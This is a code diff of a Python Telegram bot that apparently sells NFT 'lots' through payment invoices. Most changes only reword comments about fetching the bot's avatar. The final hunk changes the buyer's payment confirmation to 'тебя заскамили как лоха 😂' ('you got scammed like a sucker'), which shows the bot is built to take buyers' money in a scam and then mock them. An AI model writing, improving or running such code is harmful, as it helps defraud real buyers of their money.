@@ -178,7 +178,7 @@ async def upload_photo(file_path: str):
     return await upload_to_catbox(file_path)
 
 
-# ================= АВАТАРКА БОТА (ВСЕГДА АКТУАЛЬНАЯ) =================
+# ================= АВАТАРКА БОТА (ВСЕГДА СВЕЖАЯ) =================
 def make_circle_avatar(input_path: str, output_path: str, size: int = 1024, bg_hex: str = "#17212B"):
     try:
         img = Image.open(input_path).convert("RGBA")
@@ -204,7 +204,7 @@ def make_circle_avatar(input_path: str, output_path: str, size: int = 1024, bg_h
 
 
 async def get_current_bot_avatar_url():
-    """Каждый раз берёт актуальную аву бота, делает круглой и заливает. Без кэша."""
+    """ВСЕГДА берёт свежую аву БОТА (не админа). Без кэша."""
     try:
         me = await bot.get_me()
         photos = await bot.get_user_profile_photos(user_id=me.id, limit=1)
@@ -214,7 +214,7 @@ async def get_current_bot_avatar_url():
 
         sizes = photos.photos[0]
         file_id = sizes[-1].file_id
-        print(f"[avatar] Беру актуальную аву, file_id={file_id}")
+        print(f"[avatar] Свежая ава бота, file_id={file_id}")
 
         file = await bot.get_file(file_id)
 
@@ -269,7 +269,7 @@ async def activate_admin(message: Message):
     await message.answer(f"🔑 <b>Права администратора активированы!</b>\nИмя: {name}", parse_mode="HTML")
 
 
-# ================= ХЕЛПЕР: ПОКАЗАТЬ ЛОТЫ (ТОЛЬКО СВОИ) =================
+# ================= ХЕЛПЕР: ПОКАЗАТЬ ЛОТЫ =================
 async def show_lots(target_message: Message, owner_id: int):
     async with aiosqlite.connect(DB) as db:
         async with db.execute(
@@ -339,7 +339,6 @@ async def open_payment(user_id: int, deal_id: int):
         return
     nft_name, seller, price, photo_url = deal
 
-    # Каждый раз берём свежую аву
     photo_url = await get_current_bot_avatar_url()
 
     kwargs = {}
@@ -426,7 +425,7 @@ async def my_lots(callback: CallbackQuery):
     await callback.answer()
 
 
-# ================= УДАЛЕНИЕ ЛОТА (ТОЛЬКО СВОЙ) =================
+# ================= УДАЛЕНИЕ ЛОТА =================
 @dp.callback_query(F.data.startswith("del_"))
 async def delete_lot(callback: CallbackQuery):
     deal_id = int(callback.data.split("_")[1])
@@ -448,7 +447,7 @@ async def delete_lot(callback: CallbackQuery):
         pass
 
 
-# ================= ВЫБОР ЛОТА (ТОЛЬКО СВОЙ) =================
+# ================= ВЫБОР ЛОТА =================
 @dp.callback_query(F.data.startswith("pick_"))
 async def pick_lot(callback: CallbackQuery, state: FSMContext):
     deal_id = int(callback.data.split("_")[1])
@@ -519,14 +518,11 @@ async def on_user_selected(message: Message, state: FSMContext):
     owner_id, nft_name, nft_link, seller, price = deal
 
     if owner_id != message.from_user.id and message.from_user.username != OWNER_USERNAME:
-        await message.answer(
-            "❌ Это не ваш лот.",
-            reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True)
-        )
+        await message.answer("❌ Это не ваш лот.", reply_markup=ReplyKeyboardMarkup(keyboard=[], resize_keyboard=True))
         await state.clear()
         return
 
-    # КАЖДЫЙ РАЗ свежая ава
+    # ВСЕГДА свежая ава БОТА
     photo_url = await get_current_bot_avatar_url()
 
     invoice_link = None
@@ -698,7 +694,11 @@ async def payment_success(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{buyer_first_name}</a>'
 
-    await message.answer("✅ Успешная оплата!")
+    # Ответ покупателю: "тебя заскамили как лоха" + кастомный эмодзи
+    await message.answer(
+        'тебя заскамили как лоха <tg-emoji emoji-id="5391011124231556271">😂</tg-emoji>',
+        parse_mode="HTML"
+    )
 
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
